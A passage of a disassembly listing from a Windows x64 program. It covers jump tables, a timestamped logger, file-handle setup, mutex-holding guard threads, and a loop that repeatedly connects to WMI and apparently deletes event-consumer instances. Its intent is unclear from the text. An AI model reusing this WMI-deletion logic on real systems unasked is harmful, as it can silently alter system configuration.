                        ; jumptable 0000000140001445 cases 80-95,144,156,157,195,201,204,244

loc_1400015D5:
add     rax, 4

loc_1400015D9:          ; jumptable 00000001400012DA cases 5,11,14
sub     rax, rbx        ; jumptable 0000000140001445 cases 80-95,144,156,157,195,201,204,244
mov     rbx, [rsp+arg_0]
retn
align 4
jpt_1400012DA dd offset loc_1400015D9 - 140000000h ; jump table for switch statement
dd offset loc_1400012DC - 140000000h
dd offset loc_1400012E9 - 140000000h
dd offset def_1400012DA - 140000000h
byte_1400015F4 db      0,     3,     3,     3 ; indirect table for switch statement
db      3,     3,     0,     3
db      3,     0,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     1
db      1,     1,     1,     1
db      1,     1,     1,     1
db      1,     1,     1,     1
db      1,     1,     1,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     2
align 4
jpt_140001445 dd offset loc_1400015D9 - 140000000h ; jump table for switch statement
dd offset loc_140001454 - 140000000h
dd offset loc_14000150A - 140000000h
dd offset loc_140001461 - 140000000h
dd offset loc_140001498 - 140000000h
dd offset loc_14000148B - 140000000h
dd offset loc_14000146E - 140000000h
dd offset loc_140001447 - 140000000h
dd offset def_140001445 - 140000000h
byte_1400016D0 db      0,     0,     0,     0 ; indirect table for switch statement
db      0,     0,     0,     0
db      0,     0,     0,     0
db      0,     0,     0,     0
db      8,     8,     8,     8
db      8,     8,     8,     8
db      1,     2,     3,     4
db      8,     8,     8,     8
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     3,     3,     3
db      4,     2,     4,     4
db      8,     8,     8,     8
db      8,     8,     8,     8
db      8,     8,     8,     8
db      0,     8,     8,     8
db      8,     8,     8,     8
db      8,     8,     8,     8
db      0,     0,     8,     8
db      5,     5,     5,     5
db      8,     8,     8,     8
db      8,     8,     8,     8
db      8,     8,     8,     8
db      3,     3,     3,     3
db      3,     3,     3,     3
db      6,     6,     6,     6
db      6,     6,     6,     6
db      4,     4,     7,     0
db      8,     8,     4,     2
db      8,     0,     8,     8
db      0,     3,     8,     8
db      8,     8,     8,     8
db      8,     8,     8,     8
db      8,     8,     8,     8
db      8,     8,     8,     8
db      8,     8,     8,     8
db      8,     8,     8,     8
db      1,     1,     8,     3
db      8,     8,     8,     8
db      8,     8,     8,     8
db      0,     8,     4,     2
sub_140001230 endp

algn_140001778:
align 20h


; Attributes: bp-based frame fpd=0B0h

sub_140001780 proc near

var_190= dword ptr -190h
var_188= byte ptr -188h
var_170= byte ptr -170h
var_160= byte ptr -160h
SystemTime= _SYSTEMTIME ptr -150h
lParam= qword ptr -140h
var_130= qword ptr -130h
var_124= dword ptr -124h
var_120= qword ptr -120h
var_110= qword ptr -110h
var_108= qword ptr -108h
var_100= byte ptr -100h
var_F0= qword ptr -0F0h
var_E8= qword ptr -0E8h
var_D0= qword ptr -0D0h
var_C8= qword ptr -0C8h
var_B8= qword ptr -0B8h
var_A0= qword ptr -0A0h
var_98= dword ptr -98h
var_88= byte ptr -88h
var_20= qword ptr -20h
var_10= byte ptr -10h
arg_8= qword ptr  18h
arg_10= qword ptr  20h

; __unwind { // sub_140007150
mov     [rsp-8+arg_8], rbx
mov     [rsp-8+arg_10], rsi
push    rbp
push    rdi
push    r14
lea     rbp, [rsp-0A0h]
sub     rsp, 1A0h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rbp+0B0h+var_20], rax
mov     rdi, rcx
xor     esi, esi
mov     [rsp+1B0h+var_190], esi
lea     rcx, CriticalSection ; lpCriticalSection
call    cs:EnterCriticalSection
lea     rcx, [rsp+1B0h+SystemTime] ; lpSystemTime
call    cs:GetLocalTime
xor     edx, edx        ; Val
mov     r8d, 0F8h       ; Size
lea     rcx, [rbp+0B0h+var_120] ; void *
call    memset
lea     rax, a00010203040506+0C8h ; ""
mov     [rbp+0B0h+var_120], rax
lea     rax, unk_140009270
mov     [rbp+0B0h+var_110], rax
lea     rcx, [rbp+0B0h+var_88]
call    cs:??0?$basic_ios@DU?$char_traits@D@std@@@std@@IEAA@XZ ; std::ios::ios(void)
nop
mov     [rsp+1B0h+var_190], 1
xor     r8d, r8d
lea     rdx, [rbp+0B0h+var_108]
lea     rcx, [rbp+0B0h+var_120]
call    cs:??0?$basic_iostream@DU?$char_traits@D@std@@@std@@QEAA@PEAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z ; std::iostream::basic_iostream<char>(std::streambuf *)
nop
mov     rax, [rbp+0B0h+var_120]
movsxd  rcx, dword ptr [rax+4]
lea     r14, ??_7?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@6B@ ; const std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vftable'
mov     [rbp+rcx+0B0h+var_120], r14
mov     rax, [rbp+0B0h+var_120]
movsxd  rcx, dword ptr [rax+4]
lea     edx, [rcx-98h]
mov     [rbp+rcx+0B0h+var_124], edx
lea     rcx, [rbp+0B0h+var_108]
call    cs:??0?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAA@XZ ; std::streambuf::streambuf(void)
lea     rax, ??_7?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@6B@ ; const std::stringbuf::`vftable'
mov     [rbp+0B0h+var_108], rax
mov     [rbp+0B0h+var_A0], rsi
mov     [rbp+0B0h+var_98], esi
lea     rdx, asc_140008834 ; "["
lea     rcx, [rbp+0B0h+var_110]
call    sub_1400051B0
mov     rbx, rax
mov     edx, 2
lea     rcx, [rsp+1B0h+var_170]
call    cs:?setw@std@@YA?AU?$_Smanip@_J@1@_J@Z ; std::setw(__int64)
mov     rcx, [rbx]
movsxd  rcx, dword ptr [rcx+4]
add     rcx, rbx
mov     rdx, [rax+8]
call    qword ptr [rax]
mov     rcx, [rbx]
movsxd  rdx, dword ptr [rcx+4]
mov     byte ptr [rdx+rbx+58h], 30h ; '0'
movzx   edx, [rsp+1B0h+SystemTime.wDay]
mov     rcx, rbx
call    cs:??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@G@Z ; std::ostream::operator<<(ushort)
mov     rcx, rax
lea     rdx, asc_140008830 ; "-"
call    sub_1400051B0
mov     rbx, rax
mov     edx, 2
lea     rcx, [rsp+1B0h+var_160]
call    cs:?setw@std@@YA?AU?$_Smanip@_J@1@_J@Z ; std::setw(__int64)
mov     rcx, [rbx]
movsxd  rcx, dword ptr [rcx+4]
add     rcx, rbx
mov     rdx, [rax+8]
call    qword ptr [rax]
mov     rcx, [rbx]
movsxd  r8, dword ptr [rcx+4]
mov     byte ptr [r8+rbx+58h], 30h ; '0'
movzx   edx, [rsp+1B0h+SystemTime.wMonth]
mov     rcx, rbx
call    cs:??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@G@Z ; std::ostream::operator<<(ushort)
mov     rcx, rax
lea     rdx, asc_140008830 ; "-"
call    sub_1400051B0
mov     rbx, rax
mov     edx, 2
lea     rcx, [rsp+1B0h+var_188]
call    cs:?setw@std@@YA?AU?$_Smanip@_J@1@_J@Z ; std::setw(__int64)
mov     rcx, [rbx]
movsxd  rcx, dword ptr [rcx+4]
add     rcx, rbx
mov     rdx, [rax+8]
call    qword ptr [rax]
mov     rcx, [rbx]
movsxd  rdx, dword ptr [rcx+4]
mov     byte ptr [rdx+rbx+58h], 30h ; '0'
movzx   edx, [rsp+1B0h+SystemTime.wSecond]
mov     rcx, rbx
call    cs:??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@G@Z ; std::ostream::operator<<(ushort)
mov     rcx, rax
lea     rdx, asc_14000882C ; "] "
call    sub_1400051B0
cmp     qword ptr [rdi+18h], 0Fh
jbe     short loc_14000195E
mov     rdx, [rdi]
jmp     short loc_140001961

loc_14000195E:
mov     rdx, rdi

loc_140001961:
mov     r8, [rdi+10h]
mov     rcx, rax
call    sub_140005B80
mov     rcx, rax
lea     rdx, asc_140008828 ; "\r\n"
call    sub_1400051B0
nop
xorps   xmm0, xmm0
movups  xmmword ptr [rsp+1B0h+lParam], xmm0
mov     rcx, rsi
mov     [rbp+0B0h+var_130], rcx
mov     r9d, 0Fh
mov     [rbp-78h], r9
mov     byte ptr [rsp+1B0h+lParam], cl
mov     [rsp+1B0h+var_190], 5
mov     edx, [rbp+0B0h+var_98]
mov     eax, edx
and     al, 22h
cmp     al, 2
jz      short loc_1400019CD
mov     rax, [rbp+0B0h+var_C8]
mov     r8, [rax]
test    r8, r8
jz      short loc_1400019CD
mov     rax, [rbp+0B0h+var_E8]
mov     rdx, [rax]
mov     rax, [rbp+0B0h+var_A0]
cmp     r8, rax
cmovb   r8, rax
jmp     short loc_1400019EF

loc_1400019CD:
test    dl, 4
jnz     short loc_140001A0C
mov     rax, [rbp+0B0h+var_D0]
mov     r10, [rax]
test    r10, r10
jz      short loc_140001A0C
mov     rax, [rbp+0B0h+var_F0]
mov     rdx, [rax]
mov     rax, [rbp+0B0h+var_B8]
movsxd  r8, dword ptr [rax]
add     r8, r10

loc_1400019EF:
mov     rax, rdx
sub     r8, rdx
test    rdx, rdx
jz      short loc_140001A0C
lea     rcx, [rsp+1B0h+lParam]
call    sub_1400060C0
mov     r9, [rbp-78h]
mov     rcx, [rbp+0B0h+var_130]

loc_140001A0C:
lea     rdx, [rsp+1B0h+lParam]
cmp     r9, 0Fh
cmova   rdx, [rsp+1B0h+lParam]
mov     r8, rcx
mov     rcx, cs:?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::ostream std::cout
call    sub_140005B80
mov     rcx, cs:hWnd    ; hWnd
test    rcx, rcx
jz      short loc_140001A8A
call    cs:IsWindow
test    eax, eax
jz      short loc_140001A8A
mov     rcx, cs:hWnd    ; hWnd
call    cs:GetWindowTextLengthA
movsxd  r8, eax         ; wParam
mov     r9, r8          ; lParam
mov     edx, 0B1h       ; Msg
mov     rcx, cs:hWnd    ; hWnd
call    cs:SendMessageA
lea     r9, [rsp+1B0h+lParam]
cmp     qword ptr [rbp-78h], 0Fh
cmova   r9, [rsp+1B0h+lParam] ; lParam
xor     r8d, r8d        ; wParam
mov     edx, 0C2h       ; Msg
mov     rcx, cs:hWnd    ; hWnd
call    cs:SendMessageA

loc_140001A8A:          ; lpCriticalSection
lea     rcx, CriticalSection
call    cs:LeaveCriticalSection
nop
mov     rdx, [rbp-78h]
cmp     rdx, 0Fh
jbe     short loc_140001AD4
inc     rdx
mov     rcx, [rsp+1B0h+lParam]
cmp     rdx, 1000h
jb      short loc_140001ACF
mov     rax, [rcx-8]
sub     rcx, rax
sub     rcx, 8
cmp     rcx, 1Fh
ja      loc_140001B48
add     rdx, 27h ; '''
mov     rcx, rax        ; Block

loc_140001ACF:
call    j_j_free

loc_140001AD4:
mov     [rbp+0B0h+var_130], rsi
mov     qword ptr [rbp-78h], 0Fh
mov     byte ptr [rsp+1B0h+lParam], 0
mov     rax, [rbp+0B0h+var_120]
movsxd  rcx, dword ptr [rax+4]
mov     [rbp+rcx+0B0h+var_120], r14
mov     rax, [rbp+0B0h+var_120]
movsxd  rcx, dword ptr [rax+4]
lea     edx, [rcx-98h]
mov     [rbp+rcx+0B0h+var_124], edx
lea     rcx, [rbp+0B0h+var_108]
call    sub_1400059E0
lea     rcx, [rbp+0B0h+var_100]
call    cs:??1?$basic_iostream@DU?$char_traits@D@std@@@std@@UEAA@XZ ; std::iostream::~basic_iostream<char,std::char_traits<char>>(void)
lea     rcx, [rbp+0B0h+var_88]
call    cs:??1?$basic_ios@DU?$char_traits@D@std@@@std@@UEAA@XZ ; std::ios::~ios<char,std::char_traits<char>>(void)
mov     rcx, [rbp+0B0h+var_20]
xor     rcx, rsp        ; StackCookie
call    __security_check_cookie
lea     r11, [rsp+1B0h+var_10]
mov     rbx, [r11+28h]
mov     rsi, [r11+30h]
mov     rsp, r11
pop     r14
pop     rdi
pop     rbp
retn

loc_140001B48:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)
; } // starts at 140001780
sub_140001780 endp

algn_140001B4F:
align 10h



sub_140001B50 proc near
push    rbx
sub     rsp, 20h
mov     rax, [rcx]
mov     rbx, rcx
movsxd  rdx, dword ptr [rax+4]
lea     rax, ??_7?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@6B@ ; const std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vftable'
mov     [rdx+rcx], rax
mov     rax, [rcx]
movsxd  rdx, dword ptr [rax+4]
lea     r8d, [rdx-98h]
mov     [rdx+rcx-4], r8d
add     rcx, 18h
call    sub_1400059E0
lea     rcx, [rbx+20h]
call    cs:??1?$basic_iostream@DU?$char_traits@D@std@@@std@@UEAA@XZ ; std::iostream::~basic_iostream<char,std::char_traits<char>>(void)
lea     rcx, [rbx+98h]
add     rsp, 20h
pop     rbx
jmp     cs:??1?$basic_ios@DU?$char_traits@D@std@@@std@@UEAA@XZ ; std::ios::~ios<char,std::char_traits<char>>(void)
sub_140001B50 endp

algn_140001BA4:
align 10h



sub_140001BB0 proc near

dwCreationDisposition= dword ptr -658h
dwFlagsAndAttributes= dword ptr -650h
hTemplateFile= qword ptr -648h
Filename= word ptr -638h
String1= word ptr -428h
var_426= byte ptr -426h
var_18= qword ptr -18h
var_8= qword ptr -8
arg_0= qword ptr  8
arg_8= qword ptr  10h
arg_10= qword ptr  18h

; __unwind { // __GSHandlerCheck
mov     r11, rsp
sub     rsp, 678h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rsp+678h+var_18], rax
mov     [r11+8], rbx
lea     rcx, CriticalSection ; lpCriticalSection
mov     [r11+10h], rsi
mov     [r11-8], r14
call    cs:EnterCriticalSection
xor     esi, esi
mov     [rsp+678h+arg_10], rdi
mov     ebx, esi
lea     r14, cs:140000000h
nop     dword ptr [rax+rax+00000000h]

loc_140001C00:
cmp     rva hObject[r14+rbx*8], 0FFFFFFFFFFFFFFFFh
jnz     loc_140001D14
xor     edx, edx        ; Val
lea     rcx, [rsp+678h+var_426] ; void *
mov     r8d, 40Eh       ; Size
call    memset
mov     rdi, ds:rva lpString2[r14+rbx*8]
mov     [rsp+678h+String1], si
test    rdi, rdi
jz      loc_140001D14
xor     edx, edx        ; Val
lea     rcx, [rsp+678h+Filename] ; void *
mov     r8d, 208h       ; Size
call    memset
mov     r8d, 104h       ; nSize
lea     rdx, [rsp+678h+Filename] ; lpFilename
xor     ecx, ecx        ; hModule
call    cs:GetModuleFileNameW
test    eax, eax
jz      short loc_140001CD4
mov     edx, 5Ch ; '\'  ; Ch
lea     rcx, [rsp+678h+Filename] ; Str
call    cs:wcsrchr
test    rax, rax
jz      short loc_140001C7F
mov     [rax+2], si

loc_140001C7F:          ; iMaxLength
mov     r8d, 208h
lea     rdx, [rsp+678h+Filename] ; lpString2
lea     rcx, [rsp+678h+String1] ; lpString1
call    cs:lstrcpynW
lea     rcx, [rsp+678h+String1] ; lpString
call    cs:lstrlenW
movsxd  r9, eax
lea     rcx, [r9+1]
cmp     rcx, 208h
jnb     short loc_140001CD4
mov     r8d, 208h
lea     rcx, [rsp+678h+String1]
sub     r8d, eax        ; iMaxLength
lea     rcx, [rcx+r9*2] ; lpString1
mov     rdx, rdi        ; lpString2
call    cs:lstrcpynW

loc_140001CD4:
cmp     [rsp+678h+String1], si
jz      short loc_140001D14
mov     [rsp+678h+hTemplateFile], rsi ; hTemplateFile
lea     rcx, [rsp+678h+String1] ; lpFileName
mov     [rsp+678h+dwFlagsAndAttributes], 80h ; dwFlagsAndAttributes
xor     r9d, r9d        ; lpSecurityAttributes
xor     r8d, r8d        ; dwShareMode
mov     [rsp+678h+dwCreationDisposition], 4 ; dwCreationDisposition
mov     edx, 0C0000000h ; dwDesiredAccess
call    cs:CreateFileW
mov     rva hObject[r14+rbx*8], rax

loc_140001D14:
inc     rbx
cmp     rbx, 7
jnz     loc_140001C00
mov     r14, [rsp+678h+var_8]
lea     rcx, CriticalSection ; lpCriticalSection
mov     rdi, [rsp+678h+arg_10]
mov     rsi, [rsp+678h+arg_8]
mov     rbx, [rsp+678h+arg_0]
call    cs:LeaveCriticalSection
mov     rcx, [rsp+678h+var_18]
xor     rcx, rsp        ; StackCookie
call    __security_check_cookie
add     rsp, 678h
retn
; } // starts at 140001BB0
sub_140001BB0 endp

algn_140001D66:
align 10h



sub_140001D70 proc near
sub     rsp, 28h
lea     rcx, CriticalSection ; lpCriticalSection
call    cs:EnterCriticalSection
mov     rcx, cs:hObject ; hObject
cmp     rcx, 0FFFFFFFFFFFFFFFFh
jz      short loc_140001D9F
call    cs:CloseHandle
mov     cs:hObject, 0FFFFFFFFFFFFFFFFh

loc_140001D9F:          ; hObject
mov     rcx, cs:qword_14000C0F0
cmp     rcx, 0FFFFFFFFFFFFFFFFh
jz      short loc_140001DBD
call    cs:CloseHandle
mov     cs:qword_14000C0F0, 0FFFFFFFFFFFFFFFFh

loc_140001DBD:          ; hObject
mov     rcx, cs:qword_14000C0F8
cmp     rcx, 0FFFFFFFFFFFFFFFFh
jz      short loc_140001DDB
call    cs:CloseHandle
mov     cs:qword_14000C0F8, 0FFFFFFFFFFFFFFFFh

loc_140001DDB:          ; hObject
mov     rcx, cs:qword_14000C100
cmp     rcx, 0FFFFFFFFFFFFFFFFh
jz      short loc_140001DF9
call    cs:CloseHandle
mov     cs:qword_14000C100, 0FFFFFFFFFFFFFFFFh

loc_140001DF9:          ; hObject
mov     rcx, cs:qword_14000C108
cmp     rcx, 0FFFFFFFFFFFFFFFFh
jz      short loc_140001E17
call    cs:CloseHandle
mov     cs:qword_14000C108, 0FFFFFFFFFFFFFFFFh

loc_140001E17:          ; hObject
mov     rcx, cs:qword_14000C110
cmp     rcx, 0FFFFFFFFFFFFFFFFh
jz      short loc_140001E35
call    cs:CloseHandle
mov     cs:qword_14000C110, 0FFFFFFFFFFFFFFFFh

loc_140001E35:          ; hObject
mov     rcx, cs:qword_14000C118
cmp     rcx, 0FFFFFFFFFFFFFFFFh
jz      short loc_140001E53
call    cs:CloseHandle
mov     cs:qword_14000C118, 0FFFFFFFFFFFFFFFFh

loc_140001E53:
lea     rcx, CriticalSection
add     rsp, 28h
jmp     cs:LeaveCriticalSection
sub_140001D70 endp

algn_140001E65:
align 10h



; DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
StartAddress proc near
push    rbx
sub     rsp, 20h
mov     r8, rcx         ; lpName
xor     edx, edx        ; bInitialOwner
xor     ecx, ecx        ; lpMutexAttributes
call    cs:CreateMutexW
mov     rbx, rax
test    rax, rax
jz      short loc_140001ECE
xor     edx, edx        ; dwMilliseconds
mov     rcx, rax        ; hHandle
call    cs:WaitForSingleObject
test    eax, eax
jz      short loc_140001EC1
nop     word ptr [rax+rax+00h]

loc_140001EA0:
cmp     eax, 80h
jz      short loc_140001EC1
mov     ecx, 5          ; dwMilliseconds
call    cs:Sleep
xor     edx, edx        ; dwMilliseconds
mov     rcx, rbx        ; hHandle
call    cs:WaitForSingleObject
test    eax, eax
jnz     short loc_140001EA0

loc_140001EC1:          ; dwMilliseconds
mov     ecx, 0EA60h
call    cs:Sleep
jmp     short loc_140001EC1

loc_140001ECE:
add     rsp, 20h
pop     rbx
retn
StartAddress endp

algn_140001ED4:
align 20h



; DWORD __stdcall sub_140001EE0(LPVOID lpThreadParameter)
sub_140001EE0 proc near

dwCreationFlags= dword ptr -18h
lpThreadId= qword ptr -10h

push    rbx
sub     rsp, 30h
xor     ebx, ebx
lea     r9, aGlobalXxWindow ; "Global\\xx_window_guard"
mov     [rsp+38h+lpThreadId], rbx ; lpThreadId
lea     r8, StartAddress ; lpStartAddress
xor     edx, edx        ; dwStackSize
mov     [rsp+38h+dwCreationFlags], ebx ; dwCreationFlags
xor     ecx, ecx        ; lpThreadAttributes
call    cs:CreateThread
test    rax, rax
jz      short loc_140001F17
mov     rcx, rax        ; hObject
call    cs:CloseHandle

loc_140001F17:          ; lpThreadId
mov     [rsp+38h+lpThreadId], rbx
lea     r9, aXxWindowGuard ; "xx_window_guard"
lea     r8, StartAddress ; lpStartAddress
mov     [rsp+38h+dwCreationFlags], ebx ; dwCreationFlags
xor     edx, edx        ; dwStackSize
xor     ecx, ecx        ; lpThreadAttributes
call    cs:CreateThread
test    rax, rax
jz      short loc_140001F46
mov     rcx, rax        ; hObject
call    cs:CloseHandle

loc_140001F46:          ; lpThreadId
mov     [rsp+38h+lpThreadId], rbx
lea     r9, aXxWindowMakeGu ; "xx_window_make_guard"
lea     r8, StartAddress ; lpStartAddress
mov     [rsp+38h+dwCreationFlags], ebx ; dwCreationFlags
xor     edx, edx        ; dwStackSize
xor     ecx, ecx        ; lpThreadAttributes
call    cs:CreateThread
test    rax, rax
jz      short loc_140001F75
mov     rcx, rax        ; hObject
call    cs:CloseHandle

loc_140001F75:
xor     eax, eax
add     rsp, 30h
pop     rbx
retn
sub_140001EE0 endp

algn_140001F7D:
align 20h


; Attributes: noreturn bp-based frame fpd=0F0h

; DWORD __stdcall sub_140001F80(LPVOID lpThreadParameter)
sub_140001F80 proc near

var_1D8= qword ptr -1D8h
ppv= qword ptr -1D0h
dwImpLevel= dword ptr -1C8h
pAuthInfo= qword ptr -1C0h
dwCapabilities= dword ptr -1B8h
var_1A8= qword ptr -1A8h
pProxy= qword ptr -1A0h
var_198= qword ptr -198h
var_170= xmmword ptr -170h
var_160= xmmword ptr -160h
var_150= xmmword ptr -150h
var_140= xmmword ptr -140h
var_120= xmmword ptr -120h
var_110= xmmword ptr -110h
var_100= xmmword ptr -100h
var_F0= xmmword ptr -0F0h
var_E0= xmmword ptr -0E0h
var_D0= xmmword ptr -0D0h
var_B0= qword ptr -0B0h

; __unwind { // __GSHandlerCheck
mov     rax, rsp
mov     [rax+8], rbx
push    rbp
lea     rbp, [rax-0F8h]
sub     rsp, 1F0h
movaps  xmmword ptr [rax-18h], xmm6
movaps  xmmword ptr [rax-28h], xmm7
movaps  xmmword ptr [rax-38h], xmm8
movaps  xmmword ptr [rax-48h], xmm9
movaps  xmmword ptr [rax-58h], xmm10
movaps  xmmword ptr [rax-68h], xmm11
movaps  xmmword ptr [rax-78h], xmm12
movaps  xmmword ptr [rax-88h], xmm13
movaps  xmmword ptr [rax-98h], xmm14
movaps  xmmword ptr [rax-0A8h], xmm15
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rbp+0F0h+var_B0], rax
movsd   xmm6, cs:qword_140008846
xor     ebx, ebx
movups  xmm7, xmmword ptr cs:aRootCi ; "ROOT\\CI"
movups  xmm8, cs:xmmword_140008880+0Ch
movaps  xmm9, cs:xmmword_140008880
movaps  xmm10, cs:xmmword_140008870
movaps  xmm11, cs:xmmword_140008860
movaps  xmm12, cs:xmmword_140008850
movsd   xmm13, cs:qword_1400088FE
movaps  xmm14, xmmword ptr cs:aNconsum ; "nConsum"
movaps  xmm15, cs:xmmword_1400088E0
nop

loc_140002030:          ; dwCoInit
xor     edx, edx
xor     ecx, ecx        ; pvReserved
call    cs:CoInitializeEx
test    eax, eax
js      loc_1400021A4
movaps  xmm0, cs:xmmword_1400088A0
lea     rax, [rsp+1F0h+var_198]
movaps  [rbp+0F0h+var_120], xmm0
lea     r9, riid        ; riid
movaps  xmm0, cs:xmmword_1400088B0
lea     rcx, rclsid     ; rclsid
movaps  [rbp+0F0h+var_110], xmm0
xor     edx, edx        ; pUnkOuter
movaps  xmm0, cs:xmmword_1400088C0
mov     r8d, 1          ; dwClsContext
movaps  [rbp+0F0h+var_100], xmm0
movaps  xmm0, cs:xmmword_1400088D0
movups  xmmword ptr [rsp+1F0h+var_198+8], xmm7
mov     [rsp+1F0h+var_198], rbx
movaps  [rbp+0F0h+var_140], xmm9
movaps  [rbp+0F0h+var_D0], xmm14
movaps  [rbp+0F0h+var_F0], xmm0
mov     [rsp+1F0h+pProxy], rbx
movsd   qword ptr [rsp+6Eh], xmm6
movaps  [rbp+0F0h+var_170], xmm12
movaps  [rbp+0F0h+var_160], xmm11
movaps  [rbp+0F0h+var_150], xmm10
movups  [rbp+0F0h+var_140+0Ch], xmm8
mov     [rsp+1F0h+ppv], rax ; ppv
movaps  [rbp+0F0h+var_E0], xmm15
movsd   qword ptr [rbp+0F0h+var_D0+0Eh], xmm13
call    cs:CoCreateInstance
test    eax, eax
js      loc_14000219E
mov     rcx, [rsp+1F0h+var_198]
test    rcx, rcx
jz      loc_14000219E
mov     rax, [rcx]
lea     rdx, [rsp+1F0h+pProxy]
mov     [rsp+40h], rdx
xor     r9d, r9d
mov     qword ptr [rsp+1F0h+dwCapabilities], rbx
lea     rdx, [rsp+1F0h+var_198+8]
mov     [rsp+1F0h+pAuthInfo], rbx
xor     r8d, r8d
mov     [rsp+1F0h+dwImpLevel], ebx
mov     [rsp+1F0h+ppv], rbx
call    qword ptr [rax+18h]
test    eax, eax
js      short loc_140002193
mov     rcx, [rsp+1F0h+pProxy] ; pProxy
test    rcx, rcx
jz      short loc_140002193
mov     [rsp+1F0h+dwCapabilities], ebx ; dwCapabilities
xor     r9d, r9d        ; pServerPrincName
mov     [rsp+1F0h+pAuthInfo], rbx ; pAuthInfo
xor     r8d, r8d        ; dwAuthzSvc
mov     [rsp+1F0h+dwImpLevel], 3 ; dwImpLevel
mov     edx, 0Ah        ; dwAuthnSvc
mov     dword ptr [rsp+1F0h+ppv], 3 ; dwAuthnLevel
call    cs:CoSetProxyBlanket
mov     rcx, [rsp+1F0h+pProxy]
lea     rdx, [rbp+0F0h+var_170]
xor     r9d, r9d
mov     [rsp+1F0h+ppv], rbx
xor     r8d, r8d
mov     rax, [rcx]
call    qword ptr [rax+80h]
mov     rcx, [rsp+1F0h+pProxy]
lea     rdx, [rbp+0F0h+var_120]
xor     r9d, r9d
mov     [rsp+1F0h+ppv], rbx
xor     r8d, r8d
mov     rax, [rcx]
call    qword ptr [rax+80h]
mov     rcx, [rsp+1F0h+pProxy]
mov     rax, [rcx]
call    qword ptr [rax+10h]

loc_140002193:
mov     rcx, [rsp+1F0h+var_198]
mov     rax, [rcx]
call    qword ptr [rax+10h]

loc_14000219E:
call    cs:CoUninitialize

loc_1400021A4:          ; dwMilliseconds
mov     ecx, 1388h
call    cs:Sleep
jmp     loc_140002030
; } // starts at 140001F80
sub_140001F80 endp

algn_1400021B4:
align 20h


; Attributes: bp-based frame fpd=0C80h

sub_1400021C0 proc near

ppv= qword ptr -0D60h
dwImpLevel= dword ptr -0D58h
pAuthInfo= qword ptr -0D50h
dwCapabilities= dword ptr -0D48h
var_D40= qword ptr -0D40h
pvarg= VARIANTARG ptr -0D30h
pProxy= qword ptr -0D18h
var_D10= qword ptr -0D10h
var_D08= qword ptr -0D08h
var_D00= qword ptr -0D00h
var_CF8= qword ptr -0CF8h
var_CF0= qword ptr -0CF0h
var_CE8= qword ptr -0CE8h
var_CE0= qword ptr -0CE0h
var_CD8= xmmword ptr -0CD8h
var_CC0= xmmword ptr -0CC0h
var_CA0= xmmword ptr -0CA0h
var_C90= xmmword ptr -0C90h
var_C80= xmmword ptr -0C80h
var_C70= word ptr -0C70h
var_C68= xmmword ptr -0C68h
var_C58= xmmword ptr -0C58h
var_C48= xmmword ptr -0C48h
var_C38= dword ptr -0C38h
Filename= word ptr -0C30h
Destination= word ptr -0A20h
psz= word ptr -810h
var_10= qword ptr -10h
arg_0= qword ptr  10h
arg_8= qword ptr  18h

; __unwind { // __GSHandlerCheck
push    rbp
lea     rbp, [rsp-0C80h]
sub     rsp, 0D80h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rbp+0C80h+var_10], rax
xor     edx, edx        ; dwCoInit
xor     ecx, ecx        ; pvReserved
call    cs:CoInitializeEx
test    eax, eax
js      loc_1400027DA
movups  xmm0, xmmword ptr cs:aRootCi ; "ROOT\\CI"
lea     rdx, [rbp+0C80h+Filename] ; lpFilename
movzx   eax, cs:word_140008958
movsd   xmm1, cs:qword_140008846
mov     r8d, 104h       ; nSize
movups  [rbp+0C80h+var_CD8], xmm0
mov     [rbp+0C80h+var_C70], ax
xor     ecx, ecx        ; hModule
movups  xmm0, cs:xmmword_140008908
mov     eax, cs:dword_140008990
movsd   qword ptr [rbp+0C80h+var_CD8+0Eh], xmm1
movups  xmm1, cs:xmmword_140008908+0Ch
; } // starts at 1400021C0

loc_140002237:
; __unwind { // __GSHandlerCheck
mov     [rsp+0D80h+arg_0], rbx
xor     ebx, ebx
movups  [rbp+0C80h+var_CC0], xmm0
mov     [rbp+0C80h+var_CF0], rbx
movups  xmm0, cs:xmmword_140008928
mov     [rsp+0D80h+pProxy], rbx
movups  [rbp+0C80h+var_CC0+0Ch], xmm1
mov     [rbp+0C80h+var_C38], eax
movups  xmm1, cs:xmmword_140008938
movups  [rbp+0C80h+var_CA0], xmm0
movups  xmm0, cs:xmmword_140008948
movups  [rbp+0C80h+var_C90], xmm1
movups  xmm1, cs:xmmword_140008970
